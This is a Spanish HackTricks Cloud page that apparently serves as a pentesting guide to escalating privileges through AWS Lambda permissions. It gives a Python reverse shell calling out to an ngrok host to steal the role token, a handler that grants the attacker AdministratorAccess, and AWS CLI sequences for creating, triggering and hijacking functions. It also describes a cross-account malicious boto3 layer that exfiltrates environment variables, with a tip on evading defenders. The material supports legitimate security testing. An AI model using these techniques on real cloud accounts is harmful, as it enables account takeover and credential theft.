# AWS - Escalada de privilegios en Lambda

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## lambda

Más información sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction`** y **`lambda:InvokeFunction`** puede **escalar privilegios al pasar un rol IAM existente a una nueva función Lambda** que incluye código para importar la biblioteca AWS relevante a su lenguaje de programación elegido, y luego usarla para realizar acciones de su elección. El código podría ejecutarse invocando la función a través de la API de AWS.

Un atacante podría abusar de esto para obtener una **shell inversa y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
También podrías **abusar de los permisos del rol de lambda** desde la propia función lambda.\
Si el rol de lambda tuviera suficientes permisos, podrías usarlo para otorgarte derechos de administrador:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**Impacto potencial:** Escalada directa de privilegios al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Ten en cuenta que aunque pueda parecer interesante **`lambda:InvokeAsync`**, por sí solo no permite ejecutar `aws lambda invoke-async`, también necesitas `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Al igual que en el escenario anterior, puedes otorgarte a ti mismo el permiso `lambda:InvokeFunction` si tienes el permiso `lambda:AddPermission`.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Escalada directa de privilegios al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un usuario con los permisos **`iam:PassRole`, `lambda:CreateFunction` y `lambda:CreateEventSourceMapping`** (y posiblemente `dynamodb:PutItem` y `dynamodb:CreateTable`), pero **sin** el permiso `lambda:InvokeFunction`, puede escalar privilegios al **pasar un rol IAM existente a una nueva función Lambda** que incluye código para importar la biblioteca AWS relevante a su lenguaje de programación elegido, y luego usarla para realizar acciones de su elección. Luego, deberán **crear una tabla DynamoDB o usar una existente** para **crear un mapeo de origen de eventos para la función Lambda que apunte a esa tabla DynamoDB**. Después, deberán poner un elemento en la tabla o esperar a que otro método lo haga para que la **función Lambda sea invocada**.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Donde el **código** en el archivo python **utilizaría el rol objetivo**. Un ejemplo sería el mismo script utilizado en el método anterior.

Después de esto, el siguiente paso depende de **si se está utilizando DynamoDB** en el entorno actual de AWS. **Si** se está **utilizando**, todo lo que se necesita hacer es **crear el mapeo de la fuente de eventos** para la función Lambda, pero si no, entonces el atacante deberá **crear una tabla con transmisión habilitada** con el siguiente comando:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Después de este comando, el atacante **conectaría la función Lambda y la tabla DynamoDB** mediante **la creación de un mapeo de fuente de eventos** con el siguiente comando:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Ahora que la función Lambda y el flujo están conectados, el atacante puede **invocar la función Lambda al activar el flujo de DynamoDB**. Esto se puede hacer colocando un elemento en la tabla de DynamoDB, lo cual activará el flujo, utilizando el siguiente comando:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
En este punto, se invocará la función Lambda y el atacante se convertirá en administrador de la cuenta de AWS.

**Impacto potencial:** Escalada de privilegios directa al rol de servicio de Lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse (o a otros) cualquier permiso** (esto genera políticas basadas en recursos para otorgar acceso al recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto potencial:** Escalada de privilegios directa al rol de servicio de lambda utilizado al otorgar permiso para modificar el código y ejecutarlo.

### `lambda:AddLayerVersionPermission`

Un atacante con este permiso puede **otorgarse a sí mismo (o a otros) el permiso `lambda:GetLayerVersion`**. Podría acceder a la capa y buscar vulnerabilidades o información sensible.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impacto potencial:** Acceso potencial a información sensible.

### `lambda:UpdateFunctionCode`

Un atacante con el permiso **`lambda:UpdateFunctionCode`** podría **actualizar el código en una función Lambda existente con un rol IAM adjunto** para que importe la biblioteca relevante de AWS en ese lenguaje de programación y la use para realizar acciones en nombre de ese rol. Luego, deberían **esperar a que se invoque si no pueden hacerlo directamente**, pero si ya existe, es probable que haya alguna forma de que se invoque.
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
Donde el archivo **.zip asociado contiene código que utiliza el rol de Lambda**. Un ejemplo podría incluir el fragmento de código de los métodos anteriores.

**Impacto potencial:** Escalada directa de privilegios al rol de servicio de Lambda utilizado.

### `lambda:UpdateFunctionConfiguration`

#### Introducción

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **código** en tu función de Lambda pero **almacenarlo por separado**, de modo que el código de la función pueda mantenerse pequeño y **varias funciones puedan compartir código**.

Dentro de Lambda, puedes verificar las rutas desde las cuales se carga el código de Python con una función como la siguiente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estos son los lugares:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por ejemplo, la biblioteca boto3 se carga desde `/var/runtime/boto3` (4ta posición).

#### Explotación

**Adjuntar una capa a una función** solo requiere el permiso `lambda:UpdateFunctionConfiguration` y **las capas se pueden compartir entre cuentas**. También necesitaríamos saber **qué bibliotecas están utilizando**, para poder reemplazarlas correctamente, pero en este ejemplo, simplemente **asumiremos que la función atacada está importando boto3**.

Para estar seguros, vamos a usar Pip para instalar la misma versión de la biblioteca boto3 que se encuentra en el tiempo de ejecución de Lambda que estamos apuntando (Python 3.7), para que no haya nada diferente que pueda causar problemas en la función objetivo. Actualmente, ese tiempo de ejecución utiliza la versión 1.9.42 de boto3.

Con el siguiente código, instalaremos la versión 1.9.42 de boto3 y sus dependencias en una carpeta local llamada "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
A continuación, abriremos `/lambda_layer/boto3/__init__.py` y agregaremos el código malicioso. La carga útil que agregaremos se ve así:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se importa de `botocore`. La función exfiltrará las variables de entorno, y el bloque try-except y el tiempo de espera de 0.1 están ahí para asegurarse de que este código no rompa nada.

{% hint style="info" %}
**Nota importante:** Ya no debes usar `from botocore.vendored import requests` en pruebas de penetración reales, porque se imprimirá una "DeprecationWarning" en los registros de CloudWatch de esa función, lo que probablemente te hará ser descubierto por un defensor.
{% endhint %}

Ahora, empaqueta ese código en un **archivo ZIP** y **cárgalo** en una **nueva capa de Lambda en la cuenta del ATACANTE**. Primero, deberás crear una carpeta "python" y colocar tus bibliotecas allí para que una vez que lo carguemos en Lambda, el código se encuentre en "/opt/python/boto3". Además, asegúrate de que la capa sea compatible con Python 3.7 y que la **capa esté en la misma región que nuestra función objetivo**. Una vez hecho esto, utilizaremos `lambda:AddLayerVersionPermission` para **hacer que la capa sea accesible públicamente** para que nuestra cuenta objetivo pueda usarla. Utiliza tus credenciales personales de AWS para esta llamada a la API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ahora, con las **credenciales comprometidas** que tenemos, ejecutaremos el siguiente comando en nuestra función Lambda objetivo "s3-getter", el cual **adjuntará nuestra capa Lambda de cuenta cruzada**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
El siguiente paso sería **invocar la función** nosotros mismos si podemos o esperar a que sea invocada por medios normales, que es el método más seguro.

Una forma **más sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto potencial:** Escalada directa de privilegios al rol de servicio lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Tal vez con esos permisos puedas crear una función y ejecutarla llamando a la URL... pero no pude encontrar una forma de probarlo, así que avísame si lo logras.

### Lambda MitM

Algunas lambdas van a estar **recibiendo información sensible de los usuarios en los parámetros**. Si obtienes RCE en una de ellas, puedes extraer la información que otros usuarios le están enviando, revísalo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
